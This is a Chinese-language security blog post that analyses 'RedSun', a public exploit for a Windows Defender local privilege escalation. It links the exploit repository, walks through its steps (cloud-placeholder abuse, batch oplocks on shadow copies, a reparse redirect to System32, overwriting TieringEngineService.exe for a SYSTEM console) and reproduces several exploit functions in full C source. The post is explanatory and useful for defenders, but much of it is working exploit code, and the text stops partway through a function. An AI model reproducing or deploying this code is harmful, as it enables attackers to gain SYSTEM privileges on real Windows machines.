#  Windows Defender 漏洞 - RedSun EXP 详细分析  
原创 Re
                    Re  蜂鸟安全   2026-04-18 11:19  
  
**0****1**  
  
**免责声明**  
  
  
Hbird Security - 蜂鸟安全  
  
  
本文所涉及的技术、思路和工具仅用于安全测试和防御研究，严禁将其用于非法入侵或其它攻击他人系统以及盈利等目的，一切后果由操作者自行承担。  
  
  
**0****1**  
  
**目录**  
  
  
Hbird Security - 蜂鸟安全  
- 漏洞成因  
  
- 整体执行流程  
  
- EXP 代码分析  
  
- ### 函数 - DestroyVSSNamesList()  
  
- ### 函数 - RetrieveCurrentVSSList()  
  
- ### 函数 - ShadowCopyFinderThread()  
  
- ### 函数 - rev()  
  
- ### 函数 - DoCloudStuff()  
  
- ### 函数 - LaunchConsoleInSessionId()  
  
- ### 函数 - IsRunningAsLocalSystem()  
  
- ### 函数 - LaunchTierManagementEng()  
  
- ### 小结  
  
- ### 总结  
  
###   
  
  
**0****1**  
  
**漏洞成因**  
  
  
Hbird Security - 蜂鸟安全  
  
  
Defender 有个云端判断机制。当它扫描到一个可疑文件时，会给文件打上 "cloud tag" 云标签。因为 Defender 的某种恢复逻辑，Defender 会尝试把文件恢复到它的原始路径。攻击者通过构造一个带有云标签的恶意文件，利用 Windows 的文件锁竞争（Oplock）、目录重定向等特性把原路径重定向到 System32 目录下，当 Defender 试图恢复文件时，把恶意文件恢复到 System32 目录。  
  
  
  
**EXP****下载地址：**  
```
https://github.com/Nightmare-Eclipse/RedSun
```  
  
  
**0****2**  
  
**整体执行流程**  
  
  
Hbird Security - 蜂鸟安全  
  
  
1. 创建命名管道 REDSUN，该管道将被 LaunchConsoleInSessionId() 中的客户端连接，以获取用户会话 ID，从而在 SYSTEM 账号下弹出控制台。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF7aLjUnjSVtkDYHoMvr6OAEfWhR0SgnvbEibvNPghNHTngmvElYNAPMcT7OTsuqLudOA8EQGTRNQwUD90vWVWzU8azntMTGNfM4/640?wx_fmt=png&from=appmsg "")  
  
  
2. 启动监控线程 ShadowCopyFinderThread，监控新卷影副本，找到文件后锁住文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF7z4r8u56ljQCwWxUvA4QOyuJYYfj3nxdfq0LL2lfPFRE24ukkSQiaEPnZkz4N6M1DXAYOteTnmTKdMB9aqaPJoPZia0f0Xlskicc/640?wx_fmt=png&from=appmsg "")  
  
  
3. 在 %TEMP% 下创建随机工作目录，目录形如 C:\Users\xxx\AppData\Local\Temp\RS-{GUID}，在该目录下创建伪装文件 TieringEngineService.exe  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF6yWcqhSCYGVg0BUSmkOiaLTFjCmIcoXXHNALdabF9MXtq5OZxwzia3oBBHh9jOU3LJOhrcoDdZ4BmKHnCkaKm8ibrXqPVaxLkfbA/640?wx_fmt=png&from=appmsg "")  
  
  
4. 向 TieringEngineService.exe 写入 EICAR 测试病毒字符串，用于故意触发 Defender 扫描和删除  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF6YEu8n5jWpqWHfTgFnueBicL2oX2znKxchIrsialY29FicCGn9vxDsiaP6icm3wsaPozZUNSSxjMBPOZg5EYEXxwYFcBKUxK9Lu7yU/640?wx_fmt=png&from=appmsg "")  
  
  
5. 标记文件待删除，调用 DoCloudStuff 将工作目录注册为云同步根，并将该文件转换为云占位符  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF630uAUkMMUWv6mur1MrLUic3C1lz8zAodDsK1V04z995aOlVrK5W5cibp8XjK9ic51ibBWLlOyXY20yzHyGFIBPcRFO4rZmPGN1yw/640?wx_fmt=png&from=appmsg "")  
  
  
6. 将原来的工作目录重命名为 {GUID}.TMP，再重新创建原目录，然后用 NtCreateFile 以 FILE_SUPERSEDE 方式重新创建该文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF69pQpIujYKdwjpmv8eRQZcsibdIiaiaTRsicIiaBSSAuDL1EUicINOD2h66Y1Klrp8BC1ZJZz4kNQdkCEQsWOr9ku05S5FkWt0Ot6wU/640?wx_fmt=png&from=appmsg "")  
  
  
7. 再次对文件加 Batch Oplock 并映射内存，这里主线程加的锁和另一个线程加上操作是一样的，申请的都是同类型的锁，但是目的不同  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1pic87O41XF64zQVOpkZUfAQryAXYdzbQx3MymGeiczjSVCAzNxjC0SHub32UsDX2FkLcHqCJ7dMdR34k2HTnW2WAuj5IzRW8JcT8Mhiajp9D4/640?wx_fmt=png&from=appmsg "")  
  
  
8. 重命名这个再次创建的文件并再次标记删除，将文件重命名为 .TEMP2  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF5aMGGwicTx1kicov8ypoJ4dukRpFqRzDpkRtj6HNmxIQVELNa3KT6ZDcMVNy7Dy2sfhPKZr2iaZ84JCLaicrOkTPg5PzdJ3BJc4Cc/640?wx_fmt=png&from=appmsg "")  
  
  
9. 打开工作目录并设置重解析点，以 FILE_DIRECTORY_FILE 打开目录，确保进程退出时目录被删除  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF78F40neSPlIkKH5ULOGD7TJ5kVHmff7SDceqUKuJxVmFv0yQ53LOIQPNh03bdbSVbUM8UH8TfXibXBgibf07ibxvbjyTZYwaWZLU/640?wx_fmt=png&from=appmsg "")  
  
  
10. 构造 REPARSE_DATA_BUFFER，设置挂载点重解析点到 C:\\Windows\\System32，后续访问该目录时会被重定向到 System32 目录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1pic87O41XF4OOmk2kvUaqTLjDdaOWzdvxc9lSww3c2QFh1uddVkYXRS3PC3dRmDcg1Y7ViaD0NCY8g7JUia43ZYMMJicvM7KsykuibM84P8pib5M/640?wx_fmt=png&from=appmsg "")  
  
  
11. 循环尝试覆盖 System32 下的同名文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF6OcQ8CYuLKmxzH9cpCwrjbthECO8qqbJhwxG350P9aIppiblRib3H5HgdC0xmibvYxOTQ65fiaywINcicYd8liauUIoruScibOSmU4cU/640?wx_fmt=png&from=appmsg "")  
  
  
12. 将自身复制到 System32 并启动 COM 服务，如果成功，那么该程序是以 SYSTEM 权限启动，会以 SYSTEM 权限弹出一个控制台窗口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1pic87O41XF7c8Uhl1RBaLG5uFBU0ibx5z59XyzyD10LUMM9RzupSZNTen8vftlJMHq7hyXzm7FtnRXibB4AtibfxpGnYuxa13bVzbqibCicpRWbg/640?wx_fmt=png&from=appmsg "")  
  
  
**bool****r = IsRunningAsLocalSystem();**  
的执行时间要提前于 main 函数，用来校验当前进程权限，所以第一次以普通权限运行 EXP 的时候并不会有控制台弹出。当然了让自定义函数提前与 main 函数执行，这个特性在 C++ 中才能实现，标准 C 语言是不行的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF7KJ6alLPRo0zOj4ow5EtFugvlibz8ZCyta6yzmq4da3h5DOpgbKZSibLgcNwFjkLD75ROzwHwKthSjhOPvBiaIBrt2dRicd746bqo/640?wx_fmt=png&from=appmsg "")  
  
  
  
**0****3**  
  
**EXP 代码分析**  
  
  
Hbird Security - 蜂鸟安全  
  
### 函数 - DestroyVSSNamesList()  
  
```
void DestroyVSSNamesList(LLShadowVolumeNames* First)
{
    while (First)
    {
        free(First->name);
        LLShadowVolumeNames* next = First->next;
        free(First);
        First = next;
    }
}
```  
  
  
该函数是用来释放链表的，在这个 EXP 中使用链表来存储卷影信息，使用结束后调用这个函数释放链表。  
  
  
  
### 函数 - RetrieveCurrentVSSList()  
  
```
LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, bool* criticalerr, int* vscnumber)
{
    if (!criticalerr || !vscnumber)
        return NULL;
    *vscnumber = 0;
    ULONG scanctx = 0;
    // 分配查询缓冲区
    ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
    ULONG retsz = 0;
    OBJECT_DIRECTORY_INFORMATION* objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz); // objdirinfo 用来存储内核对象目录信息的缓冲区
    if (!objdirinfo)
    {
        printf("Failed to allocate required buffer to query object manager directory.\n");
        *criticalerr = true;
        return NULL;
    }
    ZeroMemory(objdirinfo, reqsz);
    NTSTATUS stat = STATUS_SUCCESS;
    do
    {
        // 循环调用 _NtQueryDirectoryObject 枚举目录
        stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, FALSE, &scanctx, &retsz);
        if (stat == STATUS_SUCCESS)
            break;
        // 如果缓冲区不够大
        else if (stat != STATUS_MORE_ENTRIES)
        {
            printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);
            *criticalerr = true;
            return NULL;
        }
        // 重新分配更大的缓冲区
        free(objdirinfo);
        reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
        objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
        if (!objdirinfo)
        {
            printf("Failed to allocate required buffer to query object manager directory.\n");
            *criticalerr = true;
            return NULL;
        }
        ZeroMemory(objdirinfo, reqsz);
    } while (1);
    // 创建全 0 空内存块，用于判断列表结束
    void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
    ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));
    LLShadowVolumeNames* LLVSScurrent = NULL;
    LLShadowVolumeNames* LLVSSfirst = NULL;
    for (ULONG i = 0; i < ULONG_MAX; i++)
    {
        // 判断是否到了列表尾部
        if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
        {
            free(emptybuff);
            break;
        }
        // 判断对象是否为 Device 类型
        if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
        {
            wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
            if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
            {
                // 判断是否为 HarddiskVolumeShadowCopy 卷影副本
                if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
                {
                    (*vscnumber)++; // 找到一个卷影副本，数量 +1
                    // 链表存在，追加结点
                    if (LLVSScurrent)
                    {
                        // 将名称存入链表
                        LLVSScurrent->next = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
                        if (!LLVSScurrent->next)
                        {
                            printf("Failed to allocate memory.\n");
                            *criticalerr = true;
                            DestroyVSSNamesList(LLVSSfirst);
                            return NULL;
                        }
                        ZeroMemory(LLVSScurrent->next, sizeof(LLShadowVolumeNames));
                        LLVSScurrent = LLVSScurrent->next;
                        LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
                        if (!LLVSScurrent->name)
                        {
                            printf("Failed to allocate memory !!!\n");
                            *criticalerr = true;
                            return NULL;
                        }
                        ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
                        memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);
                    }
                    else
                    {
                        // 链表为空，创建头结点
                        LLVSSfirst = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
                        if (!LLVSSfirst)
                        {
                            printf("Failed to allocate memory.\n");
                            *criticalerr = true;
                            return NULL;
                        }
                        ZeroMemory(LLVSSfirst, sizeof(LLShadowVolumeNames));
                        LLVSScurrent = LLVSSfirst;
                        LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
                        if (!LLVSScurrent->name)
                        {
                            printf("Failed to allocate memory !!!\n");
                            *criticalerr = true;
                            return NULL;
                        }
                        ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
                        memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);
                    }
                }
            }
        }
    }
    free(objdirinfo);
    return LLVSSfirst;
}
```  
  
  
这个函数的作用是：枚举 Windows 对象管理器中的 \Device 目录，筛选出所有卷影副本（Volume Shadow Copy）设备，并将其名称以链表形式返回。  
  
  
这个函数主要用于后续的 **ShadowCopyFinderThread() 函数**  
，首次调用获取系统当前已存在的所有卷影副本列表，后续不断重新枚举 \Device，通过对比新枚举的名称是否在 vsinitial 链表中，来判断是否出现了新创建的卷影副本。一旦发现新卷影，即打开其中的恶意文件并施加 Oplock 锁，防止杀毒软件删除。  
  
  
**具体逻辑**  
  
1. 打开对象目录，函数接收一个已经打开的 \Device 目录句柄 hobjdir，由调用者通过 NtOpenDirectoryObject 获取，用于后续查询。调用者是 **ShadowCopyFinderThread() 函数**  
，下文会讲到。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1pic87O41XF6Hd7wJWfF3SvRRiam1Kaias4eh4iaxnotQsRB3dhGtibHPxTJy2BxyZuCWOIJicjefaSzFrXZ0g4VJ8QCl2nw2uItYWdY2eoVnANvM/640?wx_fmt=png&from=appmsg "")  
  
  
2. 动态分配查询缓冲区，通过循环调用 _NtQueryDirectoryObject 枚举目录条目，如果返回 STATUS_MORE_ENTRIES，说明缓冲区不足，则释放原缓冲区并增大容量后重试，直到成功获取完整列表。  
  
  
  
3. 遍历查询结果，对每个 OBJECT_DIRECTORY_INFORMATION 结构通过 memcmp 与一个全零的空结构比较，判断是否到达列表末尾，因为 NtQueryDirectoryObject 返回的数组末尾会填充零。接着检查对象类型是否为 “Device”，检查对象名称是否以 “HarddiskVolumeShadowCopy” 开头（通过 memcmp 比较，忽略大小写）。  
  
  
  
4. 构建链表，如果匹配到卷影副本，递增计算器 vscnumber，将名称 Name.Buffer 复制到新分配的宽字节字符串中，按照单向链表结构 LLShadowVolumeNames 存储，返回链表的头指针。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF4YEKiaicuiceMWQSyHtoAxxnGgzyCNkMQXibtuiawHOGeVoQNetT3nO0neD8L8ZUngtM9nWwqDmcbIVOo1qP2eTgDD4veInw0QthXk/640?wx_fmt=png&from=appmsg "")  
  
  
  
5. 错误处理，任何内存分配失败、查询失败都会设置 criticalerr = true 并释放已分配的资源。  
  
  
  
### 函数 - ShadowCopyFinderThread()  
  
```
DWORD WINAPI ShadowCopyFinderThread(wchar_t* foo)
{
    // 准备打开 Windows 内核目录 \\Device
    wchar_t devicepath[] = L"\\Device";
    UNICODE_STRING udevpath = { 0 };
    RtlInitUnicodeString(&udevpath, devicepath);
    OBJECT_ATTRIBUTES objattr = { 0 };
    InitializeObjectAttributes(&objattr, &udevpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    NTSTATUS stat = STATUS_SUCCESS;
    HANDLE hobjdir = NULL;
    stat = _NtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);
    if (stat)
    {
        printf("Failed to open object manager directory, error : 0x%0.8X", stat);
        return 1;
    }
    bool criterr = false;
    int vscnum = 0;
    LLShadowVolumeNames* vsinitial = RetrieveCurrentVSSList(hobjdir, &criterr, &vscnum); // 获取当前已有的卷影列表，后续用来判断哪个是新创建的卷影
    if (criterr)
    {
        printf("Unexpected error while listing current volume shadow copy volumes\n");
        ExitProcess(1);
    }
    bool restartscan = false;
    ULONG scanctx = 0;
    ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
    ULONG retsz = 0;
    OBJECT_DIRECTORY_INFORMATION* objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
    if (!objdirinfo)
    {
        printf("Failed to allocate required buffer to query object manager directory.\n");
        ExitProcess(1);
    }
    ZeroMemory(objdirinfo, reqsz);
    stat = STATUS_SUCCESS;
    bool srchfound = false;
scanagain:
    // 循环扫描，寻址新出现的卷影，缓冲区不够就自动扩容
    do
    {
        scanctx = 0;
        // 扫描内核 Device 目录
        stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, restartscan, &scanctx, &retsz);
        if (stat == STATUS_SUCCESS)
            break;
        else if (stat != STATUS_MORE_ENTRIES)
        {
            printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);
            ExitProcess(1);
        }
        free(objdirinfo);
        reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
        objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
        if (!objdirinfo)
        {
            printf("Failed to allocate required buffer to query object manager directory.\n");
            ExitProcess(1);
        }
        ZeroMemory(objdirinfo, reqsz);
    } while (1);
    void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
    if (!emptybuff)
    {
        printf("Failed to allocate memory !!!");
        ExitProcess(1);
    }
    ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));
    wchar_t newvsspath[MAX_PATH] = { 0 };
    wcscpy(newvsspath, L"\\Device\\");
    // 遍历设备，找到新的卷影副本
    for (ULONG i = 0; i < ULONG_MAX; i++)
    {
        if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
        {
            free(emptybuff);
            emptybuff = NULL;
            break;
        }
        // 找到 Device 类型
        if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
        {
            wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
            if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
            {
                // 找到名字以 HarddiskVolumeShadowCopy 开头
                if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
                {
                    // 和链表中存储的卷影进行对比，判断是否为新的卷影
                    LLShadowVolumeNames* current = vsinitial;
                    bool found = false;
                    while (current)
                    {
                        // 如果名字在链表中存在，表示旧卷影，found = true
                        if (_wcsicmp(current->name, objdirinfo[i].Name.Buffer) == 0)
                        {
                            found = true;
                            break;
                        }
                        current = current->next;
                    }
                    if (found)
                        continue; // 旧卷影，跳过
                    else
                    {
                        // 找到新卷影
                        srchfound = true;
                        wcscat(newvsspath, objdirinfo[i].Name.Buffer);
                        break;
                    }
                }
            }
        }
    }
    if (!srchfound) {
        restartscan = true;
        goto scanagain;
    }
    if (objdirinfo)
        free(objdirinfo);
    NtClose(hobjdir);
    wchar_t malpath[MAX_PATH] = { 0 };
    wcscpy(malpath, newvsspath); // 新卷影设备名
    wcscat(malpath, &foo[2]);    // 加上文件路径，例如: \\Device\\HarddiskVolumeShadowCopy1\\Users\\Admin\\Desktop\\virus.exe，这就是卷影副本里的文件路径
    UNICODE_STRING _malpath = { 0 };
    RtlInitUnicodeString(&_malpath, malpath);
    OBJECT_ATTRIBUTES objattr2 = { 0 };
    InitializeObjectAttributes(&objattr2, &_malpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK iostat = { 0 };
    HANDLE hlk = NULL;
retry:
    // 打开卷影里的这个文件
    stat = NtCreateFile(&hlk, DELETE | SYNCHRONIZE, &objattr2, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, NULL, NULL, NULL);
    // 如果卷影还没准备好，就不断重试，这是为了等待 VSS 完全创建完成
    if (stat == STATUS_NO_SUCH_DEVICE)
        goto retry;
    if (stat)
    {
        printf("Failed to open file, error : 0x%0.8X\n", stat);
        return 1;
    }
    printf("The sun is shinning...\n");
    OVERLAPPED ovd = { 0 };
    ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    // DeviceIoControl 申请 Batch Oplock 文件锁
    DeviceIoControl(hlk, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
    if (GetLastError() != ERROR_IO_PENDING)
    {
        printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
        return 0;
    }
    DWORD nbytes = 0;
    SetEvent(gevent);
    ResetEvent(gevent);
    // GetOverlappedResult 等待 Oplock 生效，通知主线程
    GetOverlappedResult(hlk, &ovd, &nbytes, TRUE);
    WaitForSingleObject(gevent, INFINITE);
    // 清理退出
    CloseHandle(hlk);
    WakeByAddressAll(&gevent);
    CloseHandle(gevent);
    gevent = NULL;
    return ERROR_SUCCESS;
}
```  
  
  
**卷影副本 (Shadow Copy)**  
，也称**快照**  
，是 Windows 系统提供的用于数据保护的功能，基于卷影副本 (Volume Shadow Copy Service, VSS) 实现。它允许在不中断应用程序运行的情况下，为文件或磁盘创建时间点副本，用于恢复误删除、覆盖或损坏的文件。  
  
  
函数的参数 foo，指向目标文件的完整路径，这个函数是一个独立的工作线程，EXP 进入 mian 函数后会先启动这个线程，负责持续监控系统中新创建的卷影副本，一旦发现新的卷影副本，就立即打开其中指定的恶意文件，并对其施加批处理机会锁（Batch Oplock）阻止杀软删除。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1pic87O41XF7vCjicCW1fgVsdHGqfZP4lTxlhRkQ2ofMHfHUD1FzVMfPGMpWPalx1ibT0hLJPvLVD8JoWkjFySHYr5YlNFjvEmpgwgnVF01Udw/640?wx_fmt=png&from=appmsg "")  
  
  
**具体逻辑**  
  
1. 通过 NtOpenDirectoryObject 打开内核对象目录 \Device（句柄 hobjdir），后续通过 NtQueryDirectoryObject 枚举其中的设备对象。访问权限为 0x0001，也就是 DIRECTORY_QUERY。  
  
  
2. 调用 RetrieveCurrentVSSList() 函数，即上一个分析的函数，枚举当前所有 HarddiskVolumeShadowCopy 设备，将名称存入链表 vsinitial。这个链表用于后续判断哪些卷影是新出行的。  
  
  
3.   
使用 goto scanagain 配合 restartscan 标志，反复调用 NtQueryDirectoryObject 查询 \Device 目录内容。对每次查询返回的 OBJECT_DIRECTORY_INFORMATION 数组进行遍历，过滤出类型为 Device、名称为 “HarddiskVolumeShadowCopy” 开头的对象，将枚举到的名称与链表中的名称逐一比较，如果链表中不存在，则认为这是一个新创建的卷影副本。  
  
  
4. 发现新卷影副本后，将其名称拼接到 \Device\ 后，得到设备路径。再拼接 &foo[2]（这里表示跳过 C:），最终得到的设备路径类似：**\Devive\HarddiskVolumeShadowCopy\User\...\file.exe**  
  
  
5.   
调用 NtCreateFile 打开卷影对应的文件，请求 DELETE 和 SYNCHRONIZE 权限，如果返回 STATUS_NO_SUCH_DEVICE 表示卷影尚未完全准备好，不断重试。成功打开后，通过 DeviceIoControl 发生控制码，请求批处理机会锁。  
  
  
6. 调用 SetEvent(gevent) 通知主线程已经拿到了文件句柄并开始请求锁，然后调用 GetOverlappedResult 阻塞等待 Oplock 真正被授权。授权后调用 WaitForSingleObject 等待主线程完成其他后续操作。  
  
  
### 函数 - rev()  
  
```
void rev(char* s) {
    // Initialize l and r pointers
    int l = 0;
    int r = strlen(s) - 1;
    char t;
    // Swap characters till l and r meet
    while (l < r) {
        // Swap characters
        t = s[l];
        s[l] = s[r];
        s[r] = t;
        // Move pointers towards each other
        l++;
        r--;
    }
}
```  
  
  
这是一个字符串反转函数，主线程中会写入 EICAR 测试病毒字符串，不过硬编码的字符串是经过反转处理的，需要再反转回去  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1pic87O41XF6iaD1cibZGVvTIcavBbA7jPbx3TBgE5rgia46YQaRJhMja7QsybxZG63gicDJRHThlNLseqpEjegTWfzEND5PCbibNibNZD9IKzOIeo/640?wx_fmt=png&from=appmsg "")  
  
  
### 函数 - DoCloudStuff()  
  
```
void DoCloudStuff(wchar_t* syncroot, wchar_t* filename, DWORD filesz = 0x1000)
{
    // 初始化云同步注册信息
    CF_SYNC_REGISTRATION cfreg = { 0 };
    cfreg.StructSize = sizeof(CF_SYNC_REGISTRATION);
    cfreg.ProviderName = L"SERIOUSLYMSFT"; // let's see how long you can play this game, I'm willing to go as far as you want. 这段原注释何意味，有点像在嘲讽
    cfreg.ProviderVersion = L"1.0";
    // 设置云同步策略
    CF_SYNC_POLICIES syncpolicy = { 0 };
    syncpolicy.StructSize = sizeof(CF_SYNC_POLICIES);
    syncpolicy.HardLink = CF_HARDLINK_POLICY_ALLOWED;
    syncpolicy.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
    syncpolicy.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_NONE;
    syncpolicy.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
    syncpolicy.InSync = CF_INSYNC_POLICY_NONE;
    // 注册同步根目录
    HRESULT hs = CfRegisterSyncRoot(syncroot, &cfreg, &syncpolicy, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
    if (hs)
    {
        printf("Failed to register syncroot, hr = 0x%0.8X\n", hs);
        return;
    }
    // 链接到同步根目录
    CF_CALLBACK_REGISTRATION callbackreg[1];
    callbackreg[0] = { CF_CALLBACK_TYPE_NONE, NULL };
    void* callbackctx = NULL;
    CF_CONNECTION_KEY cfkey = { 0 };
    // 连接到前面注册的云目录，获取连接句柄，准备创建文件
    hs = CfConnectSyncRoot(syncroot, callbackreg, callbackctx, CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO | CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &cfkey);
    if (hs)
    {
        printf("Failed to connect to syncroot, hr = 0x%0.8X\n", hs);
        return;
    }
    // 设置文件时间、属性
    SYSTEMTIME systime = { 0 };
    FILETIME filetime = { 0 };
    GetSystemTime(&systime);
    SystemTimeToFileTime(&systime, &filetime);
    FILE_BASIC_INFO filebasicinfo = { 0 };
    filebasicinfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
    // 构造云占位符信息，定义要创建的云占位符文件。设置文件名、大小、属性
    CF_FS_METADATA fsmetadata = { filebasicinfo, {filesz} };
    CF_PLACEHOLDER_CREATE_INFO placeholder[1] = { 0 };
    placeholder[0].RelativeFileName = filename;
    placeholder[0].FsMetadata = fsmetadata;
    // 生成唯一 ID，每个云文件都有一个唯一 ID，这里随机生成一个
    GUID uid = { 0 };
    wchar_t wuid[100] = { 0 };
    CoCreateGuid(&uid);
    StringFromGUID2(uid, wuid, 100);
    placeholder[0].FileIdentity = wuid;
    placeholder[0].FileIdentityLength = lstrlenW(wuid) * sizeof(wchar_t);
    placeholder[0].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
    DWORD processedentries = 0;
    //WaitForSingleObject(hevent, INFINITE);
    // 创建云占位符文件
    hs = CfCreatePlaceholders(syncroot, placeholder, 1, CF_CREATE_FLAG_STOP_ON_ERROR, &processedentries);
    if (hs)
    {
        printf("Failed to create placeholder file, error : 0x%0.8X\n", hs);
        return;
    }
    return;
}
```  
  
  
**Windows Cloud****Filter**  
  
Cloud Filter 是 Windows 10/11 中用于支持云文件的内核框架。它允许开发者将本地目录注册为 “同步根”，其中文件可以是仅包含元数据的占位符，实际数据在用户访问时按需从云端下载。  
  
  
**具体逻辑**  
  
1. 初始化云同步注册信息 CF_SYNC_REGISTRATION  
  
  
2. 设置同步策略 CF_SYNC_POLICIES  
  
  
3. 注册同步根 CfRegisterSyncRoot，将 syncroot 目录注册为云同步根  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF4t6VaianNic2Vsw4jspzuf5gsE2jNoJ6iazeyNCouib4eL3tbPddLHnuibv9P8zbc7JY0LNdxtXK3XKcZF70AWrHOWiaQmUPTCnMqEY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF5IDVR41tamSpYCg9EYOPxbUyQhR3N3VicEtPI91XwxCwbA9vkpRyZzHEnViagicibaqQZq6BLXFoWUDMGEibHjNGeqHHCQjV04Yjqg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1pic87O41XF5RQcI10n4Ic5L3w6M8vS4owQT8C0TwvVqLKFWPETxAmibYRAGF0CAnXpCsciag5Jo0TdNPuHziaGdSnZ4KF5kXc7KHMAw3rjHbvY/640?wx_fmt=png&from=appmsg "")  
  
  
4. 连接到同步根 CfConnectSyncRoot，建立与同步根的连接，返回 CF_CONNECTION_KEY，后续创建占位符需要此连接。  
  
  
5. 构建占位符创建信息，要转换的文件名，逻辑大小、GUID 标识等  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF6IgEslF0qibagnUcUWrUhFfMrAfrr5AojFPXA5VCib3wm0AFKNbTrfvuDeo3kLUo9kF5IJfsMycJWfDjl5gfUvBu4mpcEdr042U/640?wx_fmt=png&from=appmsg "")  
  
  
6. 创建占位符 CfCreatePlaceholders，在 syncroot 中创建或转换指定文件为云占位符，调用成功后，该文件看起来是一个普通文件，实际上是一个占位符，没有实际磁盘数据块。  
  
  
这一步也是最关键的漏洞利用点，当 Windows Defender 意识到某个恶意文件带有云标签 (cloud tag) 时，会把这个恶意文件重新写回原始位置。所以攻击者在 TEMP 目录下创建恶意文件的时候对这个恶意文件赋予 DELETE 访问权限，并且重解析目录到 System32 目录，当杀软将恶意文件写回原目录的时候会被重定向到 System32 目录下，这个还是拥有 DELETE 访问权限的，此时攻击者就可以将自身复制到 System32 目录下去覆盖 TieringEngineService.exe 文件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF54lm7lbjiaFhrRmZWjywb9qwBIXrjIuovomfUj7uXc8xPDw40rkt7Xbvs0gRxxKmfYpZunbz4Ue8IUicxibmtdmX80rn4rt9AoN8/640?wx_fmt=png&from=appmsg "")  
  
  
### 函数 - LaunchConsoleInSessionId()  
  
```
void LaunchConsoleInSessionId()
